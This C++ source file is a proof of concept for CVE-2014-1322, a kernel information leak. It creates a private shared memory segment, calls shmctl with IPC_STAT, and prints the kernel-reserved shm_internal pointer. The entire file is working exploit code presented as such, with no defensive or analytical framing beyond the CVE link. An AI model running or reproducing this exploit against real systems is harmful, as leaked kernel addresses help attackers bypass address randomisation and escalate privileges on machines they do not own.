/*
 * CVE-2014-1322 
 * https://nvd.nist.gov/vuln/detail/CVE-2014-1322
 */

#include <iostream>
#include <string>
#include <sys/shm.h>

int main(int argc, char **argv)
{
    /*
     shmget() returns the shared memory identifier associated with the key
     key.
     A shared memory segment is created if either key is equal to IPC_PRIVATE,
     or key does not have a shared memory segment identifier associated with
     it, and the IPC_CREAT bit is set in shmflg.
     */

    // ((key_t) 0) = IPC_PRIVATE
    // SHM_R = (000400)
    // SHM_W = (000200)
    int identifier = shmget(((key_t) 0), 0x1337, (000400) | (000200) );

    if (identifier < 0)
    {
        std::cerr << "shmget: Failure" << std::endl;
        return 1;
    }


    // shmid_ds = __shmid_ds_new
    struct __shmid_ds_new s;

    /*
     The shmctl() system call performs some control operations on the shared
     memory area specified by shmid.  Each shared memory segment has a data
     structure associated with it, parts of which may be altered by shmctl()
     and parts of which determine the actions of shmctl().
     */

    // IPC_STAT = 2
    int r = shmctl( identifier, 2, &s );
    if (r < 0)
    {
        std::cerr << "shmget: Failure" << std::endl;
        return 2;
    }

    /*
     void *__shmid_ds_new::shm_internal
     reserved for kernel us
     */
    std::cout << "Success: " << s.shm_internal << std::endl;

    return 1;

}
